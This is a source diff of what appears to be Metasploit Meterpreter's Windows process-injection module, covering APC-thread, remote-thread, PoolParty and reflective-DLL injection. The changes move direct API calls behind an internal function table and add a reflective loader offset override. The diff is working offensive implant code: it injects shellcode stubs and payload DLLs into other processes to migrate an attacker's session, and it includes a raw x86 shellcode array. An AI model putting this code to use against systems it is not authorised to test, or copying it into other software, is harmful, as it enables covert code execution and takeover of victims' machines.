@@ -2,7 +2,7 @@
 #include "base_inject.h"
 #include "remote_thread.h"
 #include "pool_party.h"
-#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
+#include "load_library_r.h"
 #include <tlhelp32.h>
 
 // see '/msf/external/source/shellcode/windows/x86/src/migrate/executex64.asm'
@@ -119,8 +119,6 @@ BYTE poolparty_stub_x86[] = {0x55,0x53,0x57,0x56,0x89,0xe6,0xfc,0xe9,0xbd,0x00,0
 DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter )
 {
 	DWORD dwResult                     = ERROR_ACCESS_DENIED;
-	HMODULE hNtdll                     = NULL;
-	NTQUEUEAPCTHREAD pNtQueueApcThread = NULL;
 	HANDLE hThreadSnap                 = NULL;
 	LPVOID lpApcStub                   = NULL;
 	LPVOID lpRemoteApcStub             = NULL;
@@ -247,14 +245,6 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Invalid target architecture" )
 		}
 
-		hNtdll = met_api->win_api.kernel32.LoadLibraryA( "ntdll" );
-		if( !hNtdll )
-			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: LoadLibraryA failed" )
-
-		pNtQueueApcThread = (NTQUEUEAPCTHREAD)GetProcAddress( hNtdll, "NtQueueApcThread" );
-		if( !pNtQueueApcThread )
-			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed" )
-
 		hThreadSnap = met_api->win_api.kernel32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
 		if( !hThreadSnap )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed" )
@@ -304,14 +294,14 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 				// Queue up our apc stub to run in the target thread, when our apc stub is run (when the target 
 				// thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
 				// Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
-				if( pNtQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
+				if( met_api->win_api.ntdll.ZwQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
 				{
-					dprintf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.", t.th32ThreadID );
+					dprintf("[INJECT] inject_via_apcthread: ZwQueueApcThread for thread %d Succeeded.", t.th32ThreadID );
 					dwResult = ERROR_SUCCESS;
 				}
 				else
 				{
-					dprintf("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.", t.th32ThreadID );
+					dprintf("[INJECT] inject_via_apcthread: ZwQueueApcThread for thread %d Failed.", t.th32ThreadID );
 				}
 			}
 			else
@@ -335,7 +325,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 		packet_transmit_response( ERROR_SUCCESS, remote, response );
 
 		// Sleep to give the remote side a chance to catch up...
-		Sleep( 2000 );
+		met_api->win_api.kernel32.Sleep( 2000 );
 	}
 
 	if( thread_list )
@@ -356,9 +346,6 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 
 	if( hThreadSnap )
 		met_api->win_api.kernel32.CloseHandle( hThreadSnap );
-
-	if( hNtdll )
-		met_api->win_api.kernel32.FreeLibrary( hNtdll );
 
 	SetLastError( dwResult );
 
@@ -495,7 +482,7 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 
 			dprintf("[INJECT] inject_via_remotethread: Sleeping for two seconds...");
 			// Sleep to give the remote side a chance to catch up...
-			Sleep(2000);
+			met_api->win_api.kernel32.Sleep(2000);
 		}
 
 		dprintf("[INJECT] inject_via_remotethread: Resuming the injected thread...");
@@ -530,7 +517,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 
 	LPVOID lpStub = NULL;
 	DWORD dwStubSize = 0;
-	HANDLE hHeap = GetProcessHeap();
+	HANDLE hHeap = met_api->win_api.kernel32.GetProcessHeap();
 	
 
 	if (!supports_poolparty_injection(dwMeterpreterArch, dwDestinationArch)) {
@@ -560,7 +547,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_INVALID_FUNCTION);
 		}
 
-		hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		hTriggerEvent = met_api->win_api.kernel32.CreateEventA(NULL, TRUE, FALSE, NULL);
 		if (!hTriggerEvent)
 		{
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
@@ -617,10 +604,10 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 
 			dprintf("[INJECT] inject_via_poolparty: Sleeping for two seconds...");
 			// Sleep to give the remote side a chance to catch up...
-			Sleep(2000);
+			met_api->win_api.kernel32.Sleep(2000);
 
 		}
-		SetEvent(hTriggerEvent);
+		met_api->win_api.kernel32.SetEvent(hTriggerEvent);
 		SetLastError(dwResult);
 		met_api->win_api.kernel32.CloseHandle(hTriggerEvent);
 
@@ -635,7 +622,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
  *       an x86 (wow64) process or a PE64 DLL for an x64 process). The wrapper function ps_inject_dll()
  *       in stdapi will handle this automatically.
  *
- * Note: GetReflectiveLoaderOffset() has a limitation of currenlty not being able to work for PE32 DLL's 
+ * Note: GetReflectiveLoaderOffset() has a limitation of currently not being able to work for PE32 DLL's 
  *       in a native x64 meterpereter due to compile time assumptions, however GetReflectiveLoaderOffset() 
  *       will check for this and fail gracefully.
  *
@@ -654,7 +641,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
  */
 
 
-DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize)
+DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, DWORD dwActualReflectiveLoaderOffset, LPVOID lpArg, SIZE_T stArgSize)
 {
 	DWORD dwResult = ERROR_ACCESS_DENIED;
 	LPVOID lpRemoteArg = NULL;
@@ -672,6 +659,10 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 
 		// check if the library has a ReflectiveLoader...
 		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpDllBuffer, reflectiveLoader);
+		if(dwActualReflectiveLoaderOffset != 0) {
+			dprintf("[INJECT] inject_dll. Overriding ReflectiveLoader offset with supplied value: 0x%08X", dwActualReflectiveLoaderOffset);
+			dwReflectiveLoaderOffset = dwActualReflectiveLoaderOffset;
+		}
 		if (!dwReflectiveLoaderOffset)
 			BREAK_WITH_ERROR("[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION);
 
